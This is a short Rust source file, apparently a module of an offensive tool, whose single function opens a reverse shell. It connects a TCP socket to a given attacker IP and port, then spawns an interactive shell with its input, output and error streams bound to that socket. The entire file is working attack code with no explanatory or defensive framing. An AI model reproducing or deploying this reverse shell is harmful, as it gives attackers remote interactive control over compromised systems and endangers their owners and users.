/*
revshell.rs
*/


use std::net::SocketAddr;
use std::process::{Command, Stdio};

use socket2::{Socket, Domain, Type};
use std::os::unix::io::{AsRawFd, FromRawFd};


/* Open A Reverse Shell */
pub fn shell(ip: String, port: String, shell: String) -> String{
    let full: String = format!("{}:{}", ip, port);
    let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();

    match socket.connect(&full.parse::<SocketAddr>().unwrap().into()) {
        Ok(_) => {}
        Err(err) => {
                return err.to_string();
            }
    }

    let s = socket.into_tcp_stream();
    let fd = s.as_raw_fd();

    //print_started_revshell(ip, port);

    // Open shell
    let mut result = match Command::new(format!("{}", shell))
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn() {
            Ok(ok) => ok,
            Err(err) => {
                return err.to_string();
            },
    };
    result.wait().unwrap();

    println!("Shell exited");

    return "".to_string(); // Sucess
}